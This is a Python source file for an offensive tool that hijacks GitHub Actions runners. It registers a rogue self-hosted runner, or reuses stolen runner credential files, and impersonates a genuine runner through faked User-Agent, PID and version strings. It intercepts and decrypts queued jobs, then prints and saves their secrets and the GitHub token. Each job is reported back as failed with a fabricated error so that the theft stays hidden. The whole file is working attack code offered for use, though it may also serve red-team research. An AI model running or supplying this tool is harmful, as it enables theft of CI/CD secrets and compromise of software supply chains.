"""
Hijack GitHub runners

Usage:
    gh-hijack-runner.py [options] --registration-token <token> --url <url> [--labels <labels> --ephemeral --rsa-params <rsa> --credentials <credentials> --runner <runner>]
    gh-hijack-runner.py [options] --rsa-params <rsa> --credentials <credentials> --runner <runner> [(--session-id <session> --aes-key <key>)]
    gh-hijack-runner.py [options] --rsa-params <rsa> --credentials <credentials> --runner <runner> --delete-session-id <session>
    

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    --output <folder>                       Save data to output file
    --runer-name <name>                     Runner name
    --runner-group <name>                   Runner group name
    --last-Message-id <id>                  Last message ID
    --sleep <seconds>                       Delay in second before returning an error
    --runner-version <version>              GitHub runner version to impersonate (default: latest)
    --no-fetch-version                      Do not query GitHub for the latest runner version

Args:
    --registration-token <token>            Token used to register a runner
    --url <url>                             Full repository or org URL
    --rsa-params <rsa>                      Path to .credentials_rsaparams file
    --credentials <credentials>             Path to .credentials file
    --runner <runner>                       Path to .runner file
    --session-id <session>                  Already running session id
    --aes-key <key>                         Base64 encoded AES key associated with a session id
    --labels <labels>                       Labels used for registration (ubuntu-latest,customrunner)
    --ephemeral                             Create ephemeral runner
    --delete-session-id <session>           Delete session. Warning: It will crash the related GitHub runner
    

Examples:
    $ gh-hijack-runner.py --registration-token AOTAA3TOI7SACAVKBDWEQN3F5IEO2 --url https://github.com/org/repo
    $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json

Author: @hugow
"""

from docopt import docopt
import requests
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes, inverse
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import SHA256
from Crypto.Signature import pkcs1_15
import json
from base64 import b64decode, b64encode, urlsafe_b64decode, urlsafe_b64encode
from binascii import hexlify
import uuid
from datetime import datetime, timedelta, timezone
import time
import random
from os import makedirs
from os.path import isfile
import sys

requests.packages.urllib3.disable_warnings()

GH_API_URL = "https://api.github.com"

# Fallback used when the latest version cannot be fetched from GitHub.
DEFAULT_RUNNER_VERSION = "2.320.0"
# Not validated by GitHub; kept stable for a realistic User-Agent.
RUNNER_COMMIT = "976290d966e6cc3e748a49bf8fdbe139ff764201"
OS_DESCRIPTION = "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)"

# Headers common to every request (the User-Agent is set per-runner-version).
BASE_HEADERS = {
    "Content-Type": "application/json; charset=utf-8; api-version=6.0-preview.2",
    "Accept": "application/json; api-version=6.0-preview.2",
}

# Default timeout for non long-polling requests, so we never hang forever.
DEFAULT_TIMEOUT = 30

VERBOSE = False


def fetch_latest_runner_version(timeout=DEFAULT_TIMEOUT):
    """Return the latest published actions/runner version (e.g. '2.327.0'), or None.

    GitHub deprecates very old runner versions, so impersonating the current one
    keeps registration working without manual bumps.
    """
    try:
        res = requests.get(
            f"{GH_API_URL}/repos/actions/runner/releases/latest",
            headers={"Accept": "application/vnd.github+json", "User-Agent": "gh-hijack-runner"},
            timeout=timeout,
        )
        res.raise_for_status()
        return res.json()["tag_name"].lstrip("v")
    except Exception as e:
        print(f"[!] Could not fetch latest runner version ({e}), falling back to {DEFAULT_RUNNER_VERSION}.")
        return None


class Hijack:

    _session = None
    registrationToken = None
    gitHubUrl = None
    _rsaKey = None
    _authorizationUrl = None
    _clientId = None
    _accessToken = None
    serverUrl = None
    sessionId = None
    _aesKey = None
    runnerName = "runner"
    runnerGroupName = "Default"
    _runnerPoolId = None
    _runnerId = None
    lastMessageId = 0
    _logToken = None
    _logUrl = None
    rsaparamsFile = "credentials_rsaparams.json"
    credentialsFile = "credentials.json"
    runnerFile = "runner.json"
    outputFolder = None
    labels = None
    ephemeral = False
    sleep = 0
    runner_version = DEFAULT_RUNNER_VERSION
    os_description = OS_DESCRIPTION
    runner_commit = RUNNER_COMMIT

    def __init__(self):
        self._session = requests.Session()
        self._session.headers.update(BASE_HEADERS)
        self._session.verify = False
        # Fake, per-run identity for the message-polling User-Agent: a plausible
        # PID (never our real one) and a fixed CreationTime, both stable for the
        # life of this process so the header never changes between polls, like a
        # real long-lived runner. Random per run so it is not a fixed signature.
        self._fakePid = random.randint(2, 32768)
        self._uaCreationTime = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f").replace(":", "%3A") + "Z"
        self._messageUA = None
        self.set_runner_version(self.runner_version)

    def set_runner_version(self, version):
        """Update the impersonated runner version and rebuild the default User-Agent."""
        self.runner_version = version
        self._messageUA = None  # force the message User-Agent to be rebuilt
        self._session.headers["User-Agent"] = (
            f"GitHubActionsRunner-linux-x64/{self.runner_version} "
            f"HttpProxyConfigured/True CommitSHA/{self.runner_commit}"
        )

    def _vs_user_agent(self, orchestration_id=None):
        ua = (
            f"VSServices/{self.runner_version}.0 (NetStandard; {self.os_description}) "
            f"GitHubActionsRunner-linux-x64/{self.runner_version} HttpProxyConfigured/True "
            f"ClientId/{self._clientId} GroupId/{self._runnerPoolId}"
        )
        if orchestration_id is not None:
            ua += f" OrchestrationId/{orchestration_id}"
        return ua + f" ({self.os_description})"

    def initRegistration(self):
        
        self.serverUrl, token = self.getInitialAccessToken()
        
        if token == None:
            return False

        self.getRunnerGroupsId(token)
        if self._runnerPoolId == None:
            print("[+] Fail to find a runner pool.")
            return False
            
        return self.registerRunner(self.serverUrl, token)


    def generateRSAKey(self):
        key = RSA.generate(2048)
        self._rsaKey = key

    def importRSAKey(self):

        with open(self.rsaparamsFile, "r") as f:
            rsa_params = json.load(f)
        rsa_params = {k: int(hexlify(b64decode(v)), 16) for k, v in rsa_params.items()}
        key = RSA.construct((rsa_params["modulus"], rsa_params["exponent"], rsa_params["d"], rsa_params["p"], rsa_params["q"]))

        self._rsaKey = key

    def importCredentials(self):
        with open(self.credentialsFile, "r") as f:
            credentials = json.load(f)

        self._clientId = credentials.get("data").get("clientId")
        self._authorizationUrl = credentials.get("data").get("authorizationUrl")

    def importRunner(self):
        with open(self.runnerFile, "r") as f:
            runner = json.load(f)

        self.serverUrl = runner.get("serverUrl")
        self.runnerName = runner.get("agentName")
        self.gitHubUrl = runner.get("gitHubUrl")
        self._runnerPoolId = runner.get("poolId")

    def exportRunner(self):

        runner = {
            "agentName": self.runnerName,
            "serverUrl": self.serverUrl,
            "gitHubUrl": self.gitHubUrl,
            "poolId": self._runnerPoolId
        }

        with open(self.runnerFile, "w") as f:
            f.write(json.dumps(runner, indent=2))


    def exportRSAKey(self):

        rsa_components = {
            "modulus": b64encode(long_to_bytes(self._rsaKey.n)).decode("utf-8"),
            "exponent": b64encode(long_to_bytes(self._rsaKey.e)).decode("utf-8"),
            "d": b64encode(long_to_bytes(self._rsaKey.d)).decode("utf-8"),
            "p": b64encode(long_to_bytes(self._rsaKey.p)).decode("utf-8"),
            "q": b64encode(long_to_bytes(self._rsaKey.q)).decode("utf-8"),
            "dp": b64encode(long_to_bytes((self._rsaKey.d % (self._rsaKey.p - 1)))).decode("utf-8"),
            "dq": b64encode(long_to_bytes(self._rsaKey.d % (self._rsaKey.q - 1))).decode("utf-8"),
            "inverseQ": b64encode(long_to_bytes(inverse(self._rsaKey.q, self._rsaKey.p))).decode("utf-8")
        }

        with open(self.rsaparamsFile, "w") as f:
            f.write(json.dumps(rsa_components, indent=2))

    
    def exportCredentials(self):

        credentials = {
            "scheme": "OAuth",
            "data": {
                "clientId": self._clientId,
                "authorizationUrl": self._authorizationUrl,
                "requireFipsCryptography": True
            }
        }

        with open(self.credentialsFile, "w") as f:
            f.write(json.dumps(credentials, indent=2))

    def exportComponents(self):
        self.exportCredentials()
        self.exportRSAKey()
        self.exportRunner()

    def importComponents(self):
        self.importCredentials()
        self.importRSAKey()
        self.importRunner()

    def getInitialAccessToken(self):

        data = {
            "url": self.gitHubUrl,
            "runner_event": "register"
        }
        
        self._session.headers.update({"Authorization": f"RemoteAuth {self.registrationToken}"})

        res = self._session.post(f"{GH_API_URL}/actions/runner-registration", json=data, timeout=DEFAULT_TIMEOUT)

        if res.status_code == 200:
            url = res.json().get("url")
            token = res.json().get("token")
            return url, token
        elif VERBOSE:
            print(f"[!] runner-registration returned {res.status_code}: {res.text}")
        return None, None
    
    def getRunnerGroupsId(self, token):

        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json; api-version=5.1-preview.1"
        }

        url = f"{self.serverUrl}_apis/distributedtask/pools?poolType=Automation"
        res = self._session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)

        if res.status_code == 200:
            for runnerGroup in res.json().get("value"):
                if runnerGroup.get("name") == self.runnerGroupName:
                    self._runnerPoolId = runnerGroup.get("id")

        return None

    def registerRunner(self, url, token, update=False):

        defaultLables = [
            {
                "id": 0,
                "name": "self-hosted",
                "type": "system"
            },
            {
                "id": 0,
                "name": "Linux",
                "type": "system"
            },
            {
                "id": 0,
                "name": "X64",
                "type": "system"
            }
        ]

        labels = []
        if self.labels != None:
            for l in self.labels.split(","):
                labels.append({
                    "id": 0,
                    "name": l,
                    "type": "user"
                })
        else:
            labels = defaultLables
        

        self._session.headers.update({"Authorization": f"Bearer {token}"})
        data = { 
            "labels": labels,
            "maxParallelism": 1,
            "createdOn": "0001-01-01T00:00:00",
            "authorization": {
                "publicKey": {
                    "exponent": b64encode(long_to_bytes(self._rsaKey.e)).decode('utf-8'),
                    "modulus": b64encode(long_to_bytes(self._rsaKey.n)).decode('utf-8')
                }
            },
            "id": 0,
            "name": self.runnerName,
            "version": self.runner_version,
            "osDescription": self.os_description,
            "ephemeral": self.ephemeral,
            "disableUpdate": False,
            "status": 0,
            "provisioningState": "Provisioned"
        }

        if update:
            res = self._session.put(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data, timeout=DEFAULT_TIMEOUT)
        else:
            res = self._session.post(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data, timeout=DEFAULT_TIMEOUT)

        if res.status_code == 200:
            self._authorizationUrl = res.json().get("authorization").get("authorizationUrl")
            self._clientId = res.json().get("authorization").get("clientId")
            return True
        elif res.status_code == 409:
            print(f"[+] error: {res.json().get('message')}")
        
        return False


    def makeRS256JWT(self):
        """Build an RS256 client-assertion JWT with pycryptodome.

        Avoids PyJWT's RS256, which needs the separate 'cryptography' backend.
        """
        def b64url(obj):
            return urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=")

        now = datetime.now(timezone.utc)
        header = {"alg": "RS256", "typ": "JWT"}
        payload = {
            "sub": self._clientId,
            "jti": str(uuid.uuid4()),
            "iss": self._clientId,
            "aud": self._authorizationUrl,
            "exp": int((now + timedelta(minutes=4)).timestamp()),
            "nbf": int(now.timestamp()),
        }

        signing_input = b64url(header) + b"." + b64url(payload)
        signature = pkcs1_15.new(self._rsaKey).sign(SHA256.new(signing_input))
        return (signing_input + b"." + urlsafe_b64encode(signature).rstrip(b"=")).decode()

    def getAccessToken(self):

        runnerJWT = self.makeRS256JWT()

        data = {
            "grant_type": "client_credentials",
            "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            "client_assertion": runnerJWT
        }

        headers = {
            "Accept": "application/json"
        }

        res = requests.post(self._authorizationUrl, data=data, headers=headers, verify=False, timeout=DEFAULT_TIMEOUT)

        if res.status_code == 200:
            self._accessToken = res.json().get("access_token")
            self._session.headers.update({"Authorization": f"Bearer {self._accessToken}"})

    def initSession(self, sessionId, aesKey):

        if self.startSession():
            return True
        elif sessionId and aesKey != None:
            self.importSession(sessionId, aesKey)
            print("[+] Session initialized.")
            return True
        return False
    
    def deleteSession(self, sessionId):

        headers = {
            "Content-Type": "application/json; charset=utf-8; api-version=6.0-preview.1",
            "Accept": "application/json; api-version=6.0-preview.1"
        }

        res = self._session.delete(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions/{sessionId}", headers=headers, timeout=DEFAULT_TIMEOUT)
        if res.status_code ==  202 or res.status_code == 200:
            print(f"[+] Session {sessionId} deleted.")
            return True
        else:
            print(f"[+] Fail to delete session {sessionId}.")
            return False

    def startSession(self):

        # === is because it's ok to have more padding
        data = json.loads(urlsafe_b64decode(self._accessToken.split(".")[1] + "==="))

        self._runnerId = int(data.get("runner_id"))

        data = {
            "sessionId": "00000000-0000-0000-0000-000000000000",
            "ownerName": "6f67d7490611",
            "agent": {
                "id": self._runnerId,
                "name": data.get("runner_name"),
                "version": self.runner_version,
                "osDescription": self.os_description,
                "ephemeral": None,
                "status": 0,
                "provisioningState": None
            },
            "useFipsEncryption": False
        }

        self._session.headers.update({"Accept": "application/json; api-version=5.1-preview.1"})

        res = self._session.post(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions", json=data, timeout=DEFAULT_TIMEOUT)

        if res.status_code == 200:
            self.sessionId = res.json().get("sessionId")
            b64AESKey = res.json().get("encryptionKey").get("value")
            aes_key = b64decode(b64AESKey)
            self._aesKey = self.decryptDataRSA(aes_key)

            print(f"[+] Session ID: {self.sessionId}")
            print(f"[+] AES key: {b64AESKey}")

            return True
        
        elif res.status_code == 409:
            msg = res.json().get("message")
            print(f"[+] Error during session initialization: {msg}")
        
        else:
            print(f"[+] Error during session initialization.")

        return False
    
    def importSession(self, sessionId, b64AESKey):
        self.sessionId =sessionId
        aes_key = b64decode(b64AESKey)
        self._aesKey = self.decryptDataRSA(aes_key)

    def decryptDataRSA(self, data):
        key = PKCS1_OAEP.new(self._rsaKey, hashAlgo=SHA256)

        return key.decrypt(data)
    
    def decryptAES(self, iv, data):
        aes_decrypter = AES.new(self._aesKey, AES.MODE_CBC, iv=iv)
        return unpad(aes_decrypter.decrypt(data),16)
    

    def handleClearMessage(self, message):
        jobDisplayName = message.get("jobDisplayName")
        print(f"[+] New Job: {jobDisplayName}")
        
        if VERBOSE:
            print(f"[+] Message body:")
            print(message)
        
        self._logToken = message.get("resources").get("endpoints")[0].get("authorization").get("parameters").get("AccessToken")
        self._logUrl = message.get("resources").get("endpoints")[0].get("url")
    
    def getMessage(self):

        # Build the polling User-Agent once and reuse it so Pid/CreationTime stay
        # constant across the session (a real runner never changes them).
        if self._messageUA is None:
            self._messageUA = (
                f"VSServices/{self.runner_version}.0 (NetStandard; {self.os_description}) "
                f"GitHubActionsRunner-linux-x64/{self.runner_version} HttpProxyConfigured/True "
                f"ClientId/{self._clientId} RunnerId/{self._runnerId or 1} GroupId/{self._runnerPoolId} "
                f"CommitSHA/{self.runner_commit} Pid/{self._fakePid} CreationTime/{self._uaCreationTime} "
                f"(Runner) ({self.os_description})"
            )
        self._session.headers["User-Agent"] = self._messageUA
        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages?sessionId={self.sessionId}&status=Online&runnerVersion={self.runner_version}&os=Linux&architecture=X64&disableUpdate=false&lastMessageId={self.lastMessageId}"
        res = self._session.get(url, timeout=60)

        if res.status_code == 403:
            print("[+] Error while getting messages got 403.")
            return None

        if res.status_code != 200 or not res.text:
            return None

        message = res.json()

        # A migrated runner is redirected to the broker; poll its /message queue
        # once and dispatch whatever it returns (mirrors BrokerMessageListener).
        if message.get("messageType") == "BrokerMigration":
            brokerURL = json.loads(message.get("body")).get("brokerBaseUrl")
            url = f"{brokerURL}/message?sessionId={self.sessionId}&status=Online&runnerVersion={self.runner_version}&os=Linux&architecture=X64&disableUpdate=false"
            res = self._session.get(url, timeout=60)
            if res.status_code != 200 or not res.text:
                return None
            message = res.json()

        return self._dispatchMessage(message)

    def _dispatchMessage(self, message):
        """Turn a raw runner message into a job body, or None (mirrors Runner.cs)."""
        messageType = message.get("messageType")
        if VERBOSE:
            print(f"[+] Received message type: {messageType}")

        # Full job, AES-encrypted in the body (legacy HTTP queue and broker).
        if messageType == "PipelineAgentJobRequest":
            iv = b64decode(message.get("iv"))
            body = b64decode(message.get("body"))
            job = json.loads(self.decryptAES(iv, body))
            self.handleClearMessage(job)
            return job

        # Body is a ref; the real job must be fetched from the runner/run service.
        if messageType == "RunnerJobRequest":
            job = self._fetchJobFromRef(json.loads(message.get("body")))
            if job is None:
                self.lastMessageId += 1  # consumed but unusable; advance so we don't spin
            return job

        # Control message (JobCancellation, ForceTokenRefresh, AgentRefresh, ...).
        # Not a job even if it carries a jobId (e.g. JobCancellation): consume it
        # so the pool cursor advances, then ignore it.
        self.lastMessageId += 1
        return None

    def _fetchJobFromRef(self, ref):
        """Fetch the AgentJobRequestMessage pointed to by a RunnerJobRequest ref."""
        requestId = ref.get("runner_request_id")
        runServiceUrl = ref.get("run_service_url")

        if runServiceUrl:
            # New RunService path: POST {runServiceUrl}/acquirejob
            url = f"{runServiceUrl.rstrip('/')}/acquirejob"
            payload = {"jobMessageId": requestId, "runnerOS": "linux"}
            billingOwnerId = ref.get("billing_owner_id")
            if billingOwnerId is not None:
                payload["billingOwnerId"] = billingOwnerId
            res = self._session.post(url, json=payload, timeout=60)
        else:
            # Legacy path.
            url = f"{self.serverUrl}_apis/distributedtask/runnermessages/{requestId}"
            res = self._session.get(url, timeout=60)

        if res.status_code == 200 and res.text:
            job = res.json()
            self.handleClearMessage(job)
            return job

        if VERBOSE:
            print(f"[+] Could not fetch job \'{requestId}\' (HTTP {res.status_code}): {res.text[:200]}")
        return None

    def deleteMesssageFromPool(self, messageId):
        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages/{messageId}?sessionId={self.sessionId}"
        self._session.delete(url, timeout=DEFAULT_TIMEOUT)

    def jobRequestPatch(self, body):
        requestId = int(body.get('requestId'))
        data = {"requestId":requestId,"data":{}}
        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/jobrequests/{requestId}?lockToken=00000000-0000-0000-0000-000000000000"
        self._session.patch(url, json=data, timeout=DEFAULT_TIMEOUT)


    def returnTaskError(self, sessionRes, body):

        start = datetime.now(timezone.utc)
        stop = start + timedelta(seconds=4)

        data = {
            "value": [
                {
                    "id": body.get("jobId"),
                    "parentId": None,
                    "type": "Job",
                    "name": body.get("jobDisplayName"),
                    "startTime": start.strftime('%Y-%m-%dT%H:%M:%S.%fZ'),
                    "finishTime": stop.strftime('%Y-%m-%dT%H:%M:%S.%fZ'),
                    "currentOperation": None,
                    "percentComplete": 100,
                    "state": "completed",
                    "result": "failed",
                    "resultCode": None,
                    "changeId": 0,
                    "lastModified": "0001-01-01T00:00:00",
                    "workerName": self.runnerName,
                    "refName": body.get("jobName"),
                    "log": {
                        "id": 5,
                        "location": None
                    },
                    "details": None,
                    "errorCount": 1,
                    "warningCount": 0,
                    "noticeCount": 0,
                    "issues": [
                        {
                            "type": "error",
                            "category": None,
                            "message": "Process completed with exit code 127.",
                            "data": {
                                "stepNumber": "1",
                                "logFileLineNumber": "0"
                            },
                            "isInfrastructureIssue": True
                        }
                    ],
                    "variables": {},
                    "location": None,
                    "previousAttempts": [],
                    "attempt": 1,
                    "identifier": None
                }
            ],
            "count": 1
        }

        planId = body.get('plan').get('planId')
        url = f"{self._logUrl}00000000-0000-0000-0000-000000000000/_apis/distributedtask/hubs/Actions/plans/{planId}/timelines/{planId}/records"

        
        sessionRes.patch(url, json=data, timeout=DEFAULT_TIMEOUT)

    def returnJobError(self, sessionRes, body):

        data = {
            "requestId": body.get("requestId"),
            "result": "failed",
            "outputs": {},
            "actionsEnvironment": {
                "name": "PROD",
                "url": None
            },
            "name": "JobCompleted",
            "jobId": body.get("jobId")
        }

        planId = body.get('plan').get('planId')
        url = f"{self._logUrl}00000000-0000-0000-0000-000000000000/_apis/distributedtask/hubs/Actions/plans/{planId}/events"
        
        sessionRes.post(url, json=data, timeout=DEFAULT_TIMEOUT)

    def returnError(self, body):
        
        sessionRes = requests.Session()

        orchestrationId = body.get('plan').get('planId')
        headers = {
            "Accept": "application/json; api-version=5.1-preview.1",
            "User-Agent": self._vs_user_agent(orchestration_id=f"{orchestrationId}.init.__default")
        }

        sessionRes.headers.update(headers)        
        sessionRes.headers.update({"Authorization": f"Bearer {self._logToken}"})
        sessionRes.verify = False

        #self.jobRequestPatch(body)
        self.returnTaskError(sessionRes, body)
        self.returnJobError(sessionRes, body)

    def saveBody(self, body):

        with open(f"{self.outputFolder}/{self.runnerName}-{self.lastMessageId}.json", "w") as f:
            f.write(json.dumps(body))

    def renewAccessToken(self):

        data = json.loads(urlsafe_b64decode(self._accessToken.split(".")[1] + "==="))
        exp = datetime.fromtimestamp(int(data.get("exp")))

        if  datetime.now() > (exp + timedelta(minutes=5)):
            self.getAccessToken()

    def displayVariables(self, body):

        variables = body.get("variables") or {}
        for key in variables:

            if key == "system.github.token":
                print(f"- system.github.token: {variables.get(key).get('value')}")

            if not key.startswith(("system.", "Actions.", "DistributedTask.", "build.", "System.")): 
                print(f"- {key}: {variables.get(key).get('value')}")

if __name__ == "__main__":

    args = docopt(__doc__)

    if args["--verbose"]:
        VERBOSE = True

    hijack = Hijack()

    # Resolve the runner version to impersonate. GitHub deprecates old runner
    # versions, so by default we ask the API for the latest published one.
    if args["--runner-version"]:
        hijack.set_runner_version(args["--runner-version"])
    elif not args["--no-fetch-version"]:
        latest = fetch_latest_runner_version()
        if latest:
            hijack.set_runner_version(latest)
            if VERBOSE:
                print(f"[+] Impersonating runner version {latest}")

    if args["--rsa-params"]:
        hijack.rsaparamsFile = args["--rsa-params"]

    if args["--credentials"]:
        hijack.credentialsFile = args["--credentials"]

    if args["--runner"]:
        hijack.runnerFile = args["--runner"]

    if args["--url"]:
        hijack.gitHubUrl = args["--url"]

    if args["--registration-token"]:
        hijack.registrationToken = args["--registration-token"]

    if args["--output"]:
        if not isfile(args["--output"]):
            hijack.outputFolder = args["--output"]
            makedirs(hijack.outputFolder, exist_ok=True)
        else:
            print("[+] Output must be a folder.")
        

    if args["--runer-name"]:
        hijack.runnerName = args["--runer-name"]

    if args["--runner-group"]:
        hijack.runnerGroupName = args["--runner-group"]

    if args["--last-Message-id"]:
        hijack.lastMessageId = int(args["--last-Message-id"])

    if args["--labels"]:
        hijack.labels = args["--labels"]
    
    if args["--sleep"]:
        hijack.sleep = int(args["--sleep"])

    if args["--ephemeral"]:
        hijack.ephemeral = True

    if args["--registration-token"]:

        hijack.generateRSAKey()

        if hijack.initRegistration():

            hijack.exportComponents()

        else:
            print("[+] Fail to register runner.")
            sys.exit(1)

    else:
        hijack.importComponents()


    hijack.getAccessToken()
    if args["--delete-session-id"]:
        hijack.deleteSession(args["--delete-session-id"])
        sys.exit(1)

    elif not hijack.initSession(args["--session-id"], args["--aes-key"]):
        sys.exit(1)

    # Job body currently in flight (None when idle). Lets Ctrl+C fail the running
    # job cleanly without ever referencing an undefined variable.
    inflight = None
    while True:
        
        try:

            body = hijack.getMessage()
            if body:

                if body.get("jobId"):
                    inflight = body
                    hijack.deleteMesssageFromPool(hijack.lastMessageId)
                    
                    hijack.displayVariables(body)

                    if hijack.outputFolder != None:
                        hijack.saveBody(body)

                    time.sleep(hijack.sleep)
                    hijack.returnError(body)
                    inflight = None

                    if hijack.ephemeral:
                        sys.exit(0)
                    hijack.renewAccessToken()

                hijack.lastMessageId += 1

        except requests.exceptions.ReadTimeout as e:
            continue
        except KeyboardInterrupt:
            if inflight is not None:
                print("[+] Sending error to GitHub.")
                hijack.returnError(inflight)
            sys.exit(1)
